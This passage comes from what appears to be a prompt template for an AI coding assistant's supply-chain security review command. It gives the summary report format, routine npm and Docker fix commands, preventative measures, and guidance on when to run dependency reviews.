3. **SC-6 (Version ranges)**: If lockfile is always used (`npm ci`), broad ranges less risky

**How to override my findings:**
- Show legitimate use case for flagged dependency
- Provide security review approval for risky script
- Explain dependency policy that allows pattern

I'm optimizing for secure-by-default supply chain. If there's a good reason for a practice, let's discuss!

---

*Review completed: {YYYY-MM-DD}*
*Session: [{SESSION_SLUG}](../README.md)*
```

# SUMMARY OUTPUT

After creating review, print:

```markdown
# Supply Chain Security Review Complete

## Review Location
Saved to: `.claude/{SESSION_SLUG}/reviews/review-supply-chain-{YYYY-MM-DD}.md`

## Merge Recommendation
**{BLOCK | REQUEST_CHANGES | APPROVE_WITH_COMMENTS}**

## Critical Supply Chain Risks (BLOCKER)
1. **{Finding ID}**: {Risk} - {Impact}
2. **{Finding ID}**: {Risk} - {Impact}

## High-Risk Issues (HIGH)
1. **{Finding ID}**: {Issue} - {Risk}
2. **{Finding ID}**: {Issue} - {Risk}

## Statistics
- Dependencies reviewed: {count}
- New dependencies: +{X}, removed: -{Y}
- Findings: BLOCKER: {X}, HIGH: {X}, MED: {X}, LOW: {X}, NIT: {X}
- CVEs: Critical: {X}, High: {X}, Medium: {X}
- Malicious packages: {count}
- Risky scripts: {count}
- Unpinned artifacts: {count}

## Supply Chain Hygiene Score
**{45}/100** (Target: 80+)

## Vulnerability Summary
{If CVEs found:}
- Critical (CVSS >= 9.0): {count}
  - {CVE-ID}: {Package} - {Description}
- High (CVSS >= 7.0): {count}
- Medium (CVSS >= 4.0): {count}

## Immediate Actions Required
{If BLOCKER findings:}
1. {Finding ID}: {Fix description} ({estimated time})
2. {Finding ID}: {Fix description} ({estimated time})

**DO NOT MERGE** until BLOCKER issues resolved.

**CRITICAL**: If SC-2 (typosquatting) found:
- Rotate all secrets immediately
- Check logs for exfiltration
- Scan servers for malware

## Quick Fixes
{If HIGH findings:}
```bash
# Update vulnerable dependencies
npm audit fix --force

# Pin Docker images
docker pull node:18-alpine
docker images --digests node

# Update lockfile
npm install
```

**Total critical fix effort:** {X} minutes

## Preventative Measures
1. Enable Dependabot/Renovate
2. Add `npm audit` to CI
3. Pin Docker images by digest
4. Use `npm ci --ignore-scripts` in production
5. Review dependencies before adding

## Next Steps
{If BLOCK:}
1. Fix BLOCKER issues immediately
2. Rotate secrets if malicious package found
3. Run full security scan
4. Re-run supply-chain review

{If REQUEST_CHANGES:}
1. Fix HIGH priority issues
2. Update lockfiles
3. Pin production dependencies
4. Enable automated scanning

## References
- npm audit: https://docs.npmjs.com/cli/v8/commands/npm-audit
- Dependabot: https://github.com/dependabot
- SLSA: https://slsa.dev/
- Socket.dev: https://socket.dev/
```

# IMPORTANT: Practical Supply Chain Security

This review should be:
- **Risk-focused**: Prioritize based on exploitability and impact
- **Evidence-based**: Show actual vulnerabilities, not theoretical
- **Actionable**: Provide exact fix commands
- **Balanced**: Acknowledge necessary dependencies
- **Preventative**: Suggest automation to prevent future issues

The goal is to secure the supply chain without blocking legitimate work.

# WHEN TO USE

Run `/review:supply-chain` when:
- Before merging dependency changes
- Before releases (comprehensive check)
- After security incidents (verify fixes)
- When adding new dependencies
- Monthly (proactive scanning)

This should be in the default review chain for any PR that changes dependency files.
